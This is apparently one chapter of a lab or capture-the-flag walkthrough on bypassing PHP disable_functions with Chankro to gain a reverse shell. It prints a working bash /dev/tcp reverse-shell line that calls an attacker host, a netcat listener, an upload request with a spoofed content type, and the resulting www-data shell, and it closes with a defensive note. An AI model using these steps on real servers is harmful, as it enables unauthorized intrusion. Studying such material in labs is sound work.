# 04 — RCE around `disable_functions` with Chankro

A PHP shell that calls `system()` is useless when `system`, `exec`, `shell_exec`, `passthru`, `popen`
and `proc_open` are disabled. Chankro builds a payload that never calls any of them: it abuses
`putenv()` plus a function that shells out internally, and reaches a `bash` script instead.

## 4.1 Why the obvious shell fails

```php
<?php system($_GET['cmd']); ?>
```

uploads fine, executes fine, and returns an empty body. The function is disabled at the `php.ini`
level, so PHP logs a warning and returns `null` — no output, no error page, nothing to see in the
browser.

Enumerating the problem first is what makes the next step obvious:

```bash
curl -s 'http://192.168.91.112/applications/chan.php?cmd=phpinfo()'
```

or, cleaner, upload a one-line `phpinfo()` file through the same bypass and read the
`disable_functions` row (see [`03-upload-portal.md`](03-upload-portal.md) §3.5). The list includes the
exec family, so the payload has to avoid it.

## 4.2 The payload script

```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.49.91/443 0>&1
```

Start the listener before uploading:

```bash
nc -lvnp 443
```

## 4.3 Building the Chankro payload

[Chankro](https://github.com/TarlogicSecurity/Chankro) wraps a shell script in a PHP file and triggers
it through `putenv()` and `mail()`/`error_log()` — functions that are almost never disabled, because
the application needs them.

```bash
python2 chankro.py --arch 64 --input rev.sh --output chan.php --path /var/www/html
```

```text
Binary file rev.sh
Architecture x64
Final PHP chan.php
File created!
```

`--path` is the directory the payload executes from — the web root, `/var/www/html` — so relative
paths inside `rev.sh` resolve the way they would in a normal shell.

## 4.4 Delivering it

The same bypass as chapter 03, with the generated file:

```http
Content-Disposition: form-data; name="file"; filename="chan.php"
Content-Type: application/pdf
```

```text
Sorry! The file has been uploaded to /applications/chan.php
```

Trigger it with a request — no `cmd` parameter this time, the payload is baked in:

```bash
curl -s 'http://192.168.91.112/applications/chan.php'
```

The listener catches the connection:

```text
listening on [any] 443 ...
connect to [192.168.49.91] from (UNKNOWN) [192.168.91.112] 45122
bash: cannot set terminal process group (1247): Inappropriate ioctl for device
bash: no job control in this shell
www-data@oscp:/var/www/html$
```

## 4.5 Shell as `www-data`

```bash
www-data@oscp:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@oscp:/var/www/html$ hostname
oscp
```

Upgrade it before enumerating:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z
stty raw -echo; fg
export TERM=xterm
```

## 4.6 What this chapter is really about

`disable_functions` is a hardening measure, not a security boundary. Any function that starts a
process — `mail()`, `error_log()`, `imap_open()`, `putenv()` combined with a binary that reads its
environment — can be turned into execution. Chankro just automates the known one.

The defensive reading: disabling `system`/`exec` raises the cost of a web shell, it does not remove
it. The actual fix for this box is in chapter 03 — never let attacker-controlled PHP land in an
executable directory.

---

**Next:** [`05-credentials-and-gari.md`](05-credentials-and-gari.md)
